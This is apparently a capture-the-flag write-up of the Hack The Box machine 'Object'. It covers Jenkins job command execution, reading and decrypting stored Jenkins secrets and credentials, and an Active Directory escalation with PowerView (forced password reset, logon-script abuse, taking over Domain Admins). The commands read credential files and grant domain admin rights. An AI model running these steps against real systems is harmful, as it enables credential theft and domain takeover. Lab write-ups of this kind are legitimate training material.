# -HTB-Object

### I start with nmap . Where we find 3 IIS ports

```python
nmap -p- -sVC 10.10.11.132 -oN nmap_scan --min-rate 5000 -vv
```

<img width="668" height="267" alt="image" src="https://github.com/user-attachments/assets/2633ba58-3d53-459b-8565-af5830153336" />

### On port 80 we have a "open to receive innovative automation ideas" who redirect us to port 8080

<img width="1175" height="692" alt="image" src="https://github.com/user-attachments/assets/0c63ee21-91c5-4b79-ae5c-6f4b864f7c0b" />

### We can create an accoutn on port 8080 

<img width="721" height="615" alt="image" src="https://github.com/user-attachments/assets/6384959b-b174-4276-baaa-2e0e3a162f50" />

### We go to New Item

<img width="1905" height="601" alt="image" src="https://github.com/user-attachments/assets/07bcb08d-d77b-4d32-a325-78225167c12f" />

### We create a project / job

<img width="1812" height="933" alt="image" src="https://github.com/user-attachments/assets/782556d3-60f3-44da-919f-fc323923240c" />

### We put on "Build Triggers" -> "Build periodically"

```
* * * * *
```

<img width="1808" height="950" alt="image" src="https://github.com/user-attachments/assets/b6d733c7-6c4c-4459-b1cc-337acac99115" />

### And on the cmd the command who want us to run


<img width="1628" height="730" alt="image" src="https://github.com/user-attachments/assets/224ec909-c46d-4a9c-953d-8f83941b646a" />


###  We create a job , insert this command to see what account are in ".jenkins"

```
cmd /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users" 
```

<img width="1394" height="595" alt="image" src="https://github.com/user-attachments/assets/346e8da0-a4fd-44de-b588-49fad09c164b" />

### After we see what it s in "admin_17207690984073220035" . We type out the file 

```
cmd /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035" 
```


<img width="1747" height="605" alt="image" src="https://github.com/user-attachments/assets/7efa7eb6-d2ec-4ba9-944c-c45ff203d4bc" />


```
cmd /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml" 
```

```python
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\123123>exit 0
```

### We find a password who its encrypted 

oliver:AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=

### I find a script for decript this tipe of password on github : https://github.com/retr0-13/pwn_jenkins.git

### on the kali we make :

1. creds.xml -> all the content of config.xml 

```
cmd /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml" 
```

2. util.secret -> all the content of 

```
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c" 
```
but we save util.secret it like :
```
 echo 'gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=' | base64 -d -w 0 > util.secret   
```

3. master.key -> will be in :

```
cmd /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key" 
```

<img width="1379" height="802" alt="image" src="https://github.com/user-attachments/assets/4407dde7-ac4a-4a80-a4a2-9e39a71dcfb4" />

### And after we run it , we will fint the oliver passwd 

```python
python3 jenkins_offline_decrypt.py master.key util.secret creds.xml 
```

<img width="1098" height="122" alt="image" src="https://github.com/user-attachments/assets/89110dc5-5102-41a7-900b-8215c9f692c3" />

```
oliver:c1cdfun_d2434
```
# Oliver


### We connect as oliver and find the user flag

```
evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

<img width="1061" height="202" alt="image" src="https://github.com/user-attachments/assets/0bc7dffc-97e1-4b88-92ed-f679b6f3b33f" />


<img width="616" height="283" alt="image" src="https://github.com/user-attachments/assets/4905a096-b475-41ed-abdd-514b001e6c98" />



### We upload SharpHound.exe

```
upload SharpHound.exe
```

### And download the bloodhound file 

```
.\SharpHound.exe -c all
```

<img width="1055" height="323" alt="image" src="https://github.com/user-attachments/assets/8c314b0b-36b0-4e5b-bc91-e08bfcedfd88" />

### And use :


```
download 20250916050535_BloodHound.zip
```

<img width="976" height="251" alt="image" src="https://github.com/user-attachments/assets/eb2dbe4d-727b-4de3-9c80-3d3dfe6bc970" />


### On Bloodhound we find the chain 


<img width="1606" height="992" alt="image" src="https://github.com/user-attachments/assets/d9ff2782-b4f5-4da8-b2aa-720d6a7ac467" />


<img width="1143" height="214" alt="image" src="https://github.com/user-attachments/assets/2ecaa0ba-aa77-4dc3-bbe7-5726f2e630c3" />

# Oliver -> Smith -> Maria -> Root

# Oliver -> Smith ( have ForceChangePassword )

<img width="531" height="129" alt="image" src="https://github.com/user-attachments/assets/431c4647-cf48-4ba2-8d0b-39e35cebbb82" />

### First we uplode powerview

```
upload powerview.ps1
```
### We execute powerview

```
. .\powerview.ps1
```

### We change the passwd

```
$newpass = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
```


```
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
```

<img width="977" height="407" alt="image" src="https://github.com/user-attachments/assets/0b810058-d768-4ce4-bb43-4cda5a007726" />


# Smith -> Maria ( have GenericWrite )

<img width="639" height="153" alt="image" src="https://github.com/user-attachments/assets/c43d6037-aa2d-45e4-a28e-c3b3320eacf1" />


### First we connect to Smith

```
evil-winrm -i 10.10.11.132 -u "smith" -p 'Password1234!'
```

### We go to programdata

```
cd c:\programdata
```

### Upload powerview

```
upload powerview.ps1
```
### Run powerview

```
. .\powerview.ps1
```

### Copy maria desktop

```
echo "ls \users\maria\desktop > \programdata\out" > cmd.ps1
```

```
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
```

```
type out
```

<img width="953" height="517" alt="image" src="https://github.com/user-attachments/assets/831ebbe5-ce14-42cf-87fc-d8e253f8afc0" />


```
echo "copy c:\users\maria\desktop\Engines.xls c:\programdata\Engines.xls" > cmd.ps1
```


```
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
```


<img width="1114" height="360" alt="image" src="https://github.com/user-attachments/assets/2c60abfe-3ee3-4b93-a412-8fc7bf357279" />


### We download the file and open 

```
download Engines.xls
```

<img width="882" height="162" alt="image" src="https://github.com/user-attachments/assets/fe525e8c-fe40-4fb7-b556-5b44d0c72f84" />


# Maria -> Root ( Have WriteOwner )

<img width="748" height="219" alt="image" src="https://github.com/user-attachments/assets/604bdb63-f5ae-4c68-90df-841f1047fbf5" />


### We connect as Maria

```
evil-winrm -i 10.10.11.132 -u "maria" -p "W3llcr4ft3d_4cls"
```

```
cd c:\programdata
```

### Here i make a new directory , becouse the powerview dident work in appdata 

```
mkdir a
```

```
cd a
```

```
upload powerview.ps1
```


```
. .\powerview.ps1
```


```
Invoke-ACLScanner -ResolveGUIDs | ? { $_.IdentityReferenceName -like 'maria' }
```

<img width="952" height="279" alt="image" src="https://github.com/user-attachments/assets/3b1cc8e5-87d7-4545-abe5-46df232a31c1" />


### Make Maria to have full control 

```
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
```

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights all
```

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

<img width="823" height="172" alt="image" src="https://github.com/user-attachments/assets/0e0d3c52-6df7-4598-a3c4-b8567ff8a299" />

### After that we loggout and loggin agina 

```
evil-winrm -i 10.10.11.132 -u "maria" -p "W3llcr4ft3d_4cls"
```


### And we can read root flag in 

```
C:\Users\Administrator\Desktop
```
<img width="556" height="291" alt="image" src="https://github.com/user-attachments/assets/feb2b908-aae0-4478-9c54-464205f3f057" />





